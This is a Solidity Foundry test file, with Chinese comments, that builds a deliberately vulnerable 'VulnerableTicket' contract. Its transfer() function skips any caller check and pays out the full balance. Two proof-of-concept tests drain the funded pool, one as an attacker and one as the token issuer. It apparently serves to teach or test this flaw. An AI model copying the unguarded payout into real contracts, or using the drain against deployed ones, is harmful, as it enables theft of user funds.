pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract with Missing Token Issuer Verification vulnerability
contract VulnerableTicket {
    // 模擬 token 發行者的地址，本應僅允許此地址觸發特定功能，但漏洞在於未正確驗證
    address public tokenIssuer;
    // 票券獎勵接收者，此範例中在 runSponsor 中直接把合約餘額發給呼叫者
    address public sponsor;

    // 建構子設定 tokenIssuer 與 sponsor
    constructor(address _tokenIssuer, address _sponsor) {
        tokenIssuer = _tokenIssuer;
        sponsor = _sponsor;
    }

    // 漏洞函式：transfer
    // 註：缺少 token issuer 的驗證，攻擊者可利用此漏洞
    function transfer() external payable {
        // 漏洞重點：未檢查 msg.sender 是否與 tokenIssuer 相符
        // 攻擊者可直接呼叫此函式來觸發獎勵發放
        runSponsor();
    }

    // 其他功能, 僅允許 tokenIssuer 或本合約調用
    function otherAction() external payable {
        require(msg.sender == tokenIssuer || msg.sender == address(this), "Not allowed");
    }

    // runSponsor 函式，將合約餘額發放給呼叫者
    // 漏洞：由於缺少驗證，攻擊者可無票費要求下領取合約內所有資金
    function runSponsor() internal {
        // 傳送全額餘額給當前呼叫者
        payable(msg.sender).transfer(address(this).balance);
    }

    // 接收 Ether
    receive() external payable {}
}

contract VulnerableTicketTest is Test {
    VulnerableTicket public vulnerableTicket;
    address public tokenIssuer = address(0xF00D);
    address public sponsor = address(0x1234);
    address public attacker = address(0xBEEF);

    // Bonus pool deposit for testing
    uint256 constant BONUS_POOL = 1 ether;

    function setUp() public {
        // Deploy the contract with given tokenIssuer and sponsor addresses
        vulnerableTicket = new VulnerableTicket(tokenIssuer, sponsor);

        // Fund the VulnerableTicket contract with the bonus pool
        // Using a value transfer to the contract's receive() function
        (bool success, ) = payable(address(vulnerableTicket)).call{value: BONUS_POOL}('');
        require(success, "Funding the bonus pool failed");
        assertEq(address(vulnerableTicket).balance, BONUS_POOL);
    }

    // Test that an attacker (non-tokenIssuer) can exploit the vulnerability
    function testExploitDrainsFunds() public {
        // Record the attacker's initial balance
        uint256 initialAttackerBalance = attacker.balance;

        // Impersonate the attacker and call transfer()
        vm.startPrank(attacker);
        vulnerableTicket.transfer();
        vm.stopPrank();

        // After the call, the bonus pool should be drained from the contract
        assertEq(address(vulnerableTicket).balance, 0, "Contract balance should be zero after exploit");

        // The attacker should have received the bonus pool funds
        uint256 finalAttackerBalance = attacker.balance;
        uint256 bonusReceived = finalAttackerBalance - initialAttackerBalance;
        assertEq(bonusReceived, BONUS_POOL, "Attacker did not receive the full bonus pool");
    }

    // Test that even the token issuer can exploit the vulnerability if they call transfer without sending additional funds
    function testTokenIssuerExploit() public {
        // Reset the bonus pool by funding the contract with BONUS_POOL (the contract currently has 0 from previous test isolation)
        // In Foundry, each test has its own state, but we call setUp before each test, so the contract already has BONUS_POOL
        assertEq(address(vulnerableTicket).balance, BONUS_POOL, "Contract should have the bonus pool available");

        // Record the tokenIssuer's initial balance
        uint256 initialIssuerBalance = tokenIssuer.balance;

        // Impersonate the token issuer and call transfer() without sending extra funds
        vm.startPrank(tokenIssuer);
        vulnerableTicket.transfer();
        vm.stopPrank();

        // After the call, the bonus pool should have been drained by the token issuer
        assertEq(address(vulnerableTicket).balance, 0, "Contract balance should be zero after token issuer exploit");

        // The token issuer should receive exactly BONUS_POOL amount
        uint256 finalIssuerBalance = tokenIssuer.balance;
        uint256 bonusReceived = finalIssuerBalance - initialIssuerBalance;
        assertEq(bonusReceived, BONUS_POOL, "Token issuer did not receive the bonus pool as expected");
    }

    // Helper: provide funds to test addresses if needed
    // Foundry automatically provisions some funds to pranked addresses, but if needed, we can use vm.deal
    function _fundAddress(address addr, uint256 amount) internal {
        vm.deal(addr, amount);
    }
}
